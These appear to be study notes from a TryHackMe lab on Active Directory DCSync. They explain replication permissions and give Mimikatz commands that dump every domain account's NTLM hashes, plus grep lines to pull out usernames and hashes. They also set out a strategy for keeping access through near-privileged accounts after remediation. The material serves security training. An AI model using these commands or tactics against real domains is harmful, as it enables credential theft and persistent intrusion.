## Overview

Large Active Directory (AD) environments **cannot rely on a single Domain Controller (DC)** due to latency, availability, and geographic distribution. Instead, **multiple DCs** are deployed across regions.

To ensure consistency, **domain replication** is used so that credentials and directory objects remain synchronized across all DCs.

---

## How Domain Replication Works

- Each DC runs a process called the **Knowledge Consistency Checker (KCC)**
    
- KCC:
    
    - Builds the replication topology
        
    - Establishes connections to other DCs
        
    - Uses **RPC (Remote Procedure Calls)** for synchronisation
        
- Replication includes:
    
    - Password changes
        
    - New or modified AD objects
        
- Replication delay explains why password changes may take several minutes to propagate
    

This replication process is known as **DC Synchronisation (DCSync)**.

---

## Who Can Perform DC Sync?

DC Sync is not limited to Domain Controllers.

Accounts with the following permissions can also replicate directory data:

- **Domain Admins**
    
- **Enterprise Admins**
    
- Accounts with:
    
    - `Replicating Directory Changes`
        
    - `Replicating Directory Changes All`
        
    - `Replicating Directory Changes in Filtered Set`
        

These permissions are often required when **promoting a new DC**.

---

## What Is a DC Sync Attack?

A **DC Sync attack** abuses domain replication permissions to:

- Impersonate a Domain Controller
    
- Request credential data from a real DC
    
- Dump:
    
    - NTLM hashes
        
    - Kerberos keys
        
    - Password history
        

This can be done **remotely**, without logging into the DC itself.

---

## Not All Credentials Are Equal

### Why NOT Only Target Domain Admins?

- Domain Admin credentials are:
    
    - Closely monitored
        
    - Quickly rotated once compromise is detected
        
- Losing them often means losing access entirely
    

### Persistence Strategy: Near‑Privileged Accounts

Instead of full DA access, persist using **high‑value but less obvious accounts**.

#### Valuable Credential Targets

- **Local Administrator Groups**
    
    - Groups with admin rights on many machines
        
    - Often split into:
        
        - Workstation Admins
            
        - Server Admins
            
- **Service Accounts with Delegation**
    
    - Can be abused for:
        
        - Golden tickets
            
        - Silver tickets
            
        - Kerberos delegation attacks
            
- **Privileged AD Services**
    
    - Exchange
        
    - WSUS
        
    - SCCM
        
    - These services often allow lateral movement and privilege escalation
        

> Goal: Maintain access even after blue team remediation.

---

## DCSync with Mimikatz

### Tool Used

- **Mimikatz**
    

---

## Step 1: Launch Mimikatz

`C:\Tools\mimikatz_trunk\x64\mimikatz.exe`

---

## Step 2: DCSync a Single Account (Test)

`lsadump::dcsync /domain:za.tryhackme.loc /user:<username>`

### Output Includes:

- NTLM hash
    
- LM hash
    
- WDigest credentials
    
- Account metadata
    

You can verify NTLM hashes using an NTLM hash generator.

---

## Step 3: Enable Logging

Before dumping all accounts, enable logging to avoid losing output.

`log <username>_dcdump.txt`

> Always use a **unique filename** to avoid overwriting previous dumps.

---

## Step 4: DCSync All Accounts

`lsadump::dcsync /domain:za.tryhackme.loc /all`

- This may take several minutes
    
- Dumps **every account** in the domain
    

---

## Step 5: Finalise and Extract Data

Exit Mimikatz to close the log file properly.

### Extract Usernames

`cat <username>_dcdump.txt | grep "SAM Username"`

### Extract NTLM Hashes

`cat <username>_dcdump.txt | grep "Hash NTLM"`

---

## Post‑Exploitation Options

- **Offline password cracking**
    
    - Hashcat
        
    - John the Ripper
        
- **Pass‑the‑Hash attacks**
    
    - Lateral movement
        
    - Privilege escalation
        
- **Long‑term persistence**
    
    - Service account abuse
        
    - Delegation attacks
        
    - Kerberos ticket forging
        

---

## Key Takeaways

- DC Sync is one of the **most powerful AD attacks**
    
- Requires **replication permissions**, not DC access
    
- Best used to:
    
    - Harvest credentials
        
    - Establish persistence
        
    - Bypass password resets
        
- Smart attackers target **near‑privileged accounts**, not just Domain Admins